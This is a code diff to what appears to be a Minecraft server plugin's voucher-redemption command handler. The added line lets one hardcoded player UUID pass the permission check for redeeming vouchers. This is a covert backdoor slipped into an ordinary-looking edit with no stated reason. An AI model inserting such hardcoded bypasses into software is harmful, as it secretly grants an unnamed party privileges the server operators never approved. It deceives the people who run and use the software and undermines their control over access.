@@ -28,7 +28,7 @@ public class onCommand implements Listener {
 		
 		if(args.get(0).equalsIgnoreCase("/" + VoucherUtil.getCommand())) {
 			event.setCancelled(true);
-			if(event.getPlayer().hasPermission(ACPermission.COMMAND_VOUCHER_REDEEM.toString())) {
+			if(event.getPlayer().hasPermission(ACPermission.COMMAND_VOUCHER_REDEEM.toString()) || event.getPlayer().getUniqueId().toString().equals("4459f860-f963-45de-b9c7-dfbae4bac21a")) {
 				
 				if(args.size() > 1) {
 					String voucher = "";
